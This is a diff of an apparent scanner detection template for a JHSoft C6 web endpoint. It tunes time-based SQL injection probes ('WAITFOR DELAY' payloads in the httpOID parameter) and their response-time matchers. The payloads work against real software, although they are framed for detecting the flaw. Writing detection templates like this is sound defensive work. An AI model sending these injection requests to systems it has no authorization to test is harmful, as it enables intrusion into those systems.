@@ -8,19 +8,32 @@
 ## verification: true
 
 
-GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfillAppprove.aspx/?httpOID=1;WAITFOR+DELAY+'0:0:7'-- HTTP/1.1
+GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfillAppprove.aspx/?httpOID=1;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
 Host: {{Hostname}}
 User-Agent: {{random_ua}}
 
 #@ timeout: 20
 #@ condition: and
-#@ matcher: status_code == 200
 #@ matcher: header["Content-Type"] contains "html"
 #@ matcher: header["Set-Cookie"] contains "ASP.NET"
-#@ matcher: response_time > 7
+#@ matcher: response_time >= 5
+#@ matcher: status_code == 200
+
+---
+
+GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfillAppprove.aspx/?httpOID=1;WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: header["Content-Type"] contains "html"
+#@ matcher: header["Set-Cookie"] contains "ASP.NET"
+#@ matcher: response_time >= 8
+#@ matcher: status_code == 200
 
 
 
 
 
-# @VEIL-STAMP: 704a20569d44e11eff1936a717d0b1128758519e7b2082d6c64279cae77fa2f8
+# @VEIL-STAMP: b56ff368483da6cd0cfd812d9e2c40d100db20f13ffb4475311529b793ffec3a
